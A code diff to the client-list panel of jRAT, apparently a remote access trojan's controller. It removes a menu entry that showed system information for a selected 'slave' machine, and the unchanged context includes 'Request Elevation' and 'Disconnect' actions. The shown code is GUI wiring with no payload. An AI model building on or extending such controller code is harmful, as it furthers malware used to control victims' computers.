@@ -13,7 +13,6 @@ import jrat.controller.settings.StoreOfflineSlaves;
 import jrat.controller.ui.dialogs.DialogFileType;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.frames.FrameRename;
-import jrat.controller.ui.frames.FrameSystemInfo;
 import jrat.controller.utils.NetUtils;
 import jrat.controller.utils.Utils;
 
@@ -379,19 +378,6 @@ public abstract class PanelMainClients extends JScrollPane {
 		mntmRequestElevation.setIcon(Resources.getIcon("shield"));
 		mnTools_1.add(mntmRequestElevation);
 		popupMenu.addSeparator();
-
-		JMenuItem mntmInfo = new JMenuItem("Info");
-		mntmInfo.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				AbstractSlave slave = getSelectedSlave();
-				if (slave != null && slave instanceof Slave) {
-					FrameSystemInfo screen = new FrameSystemInfo((Slave) slave);
-					screen.setVisible(true);
-				}
-			}
-		});
-		mntmInfo.setIcon(Resources.getIcon("info"));
-		popupMenu.add(mntmInfo);
 
 		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
 		mntmForceDisconnect.addActionListener(new ActionListener() {
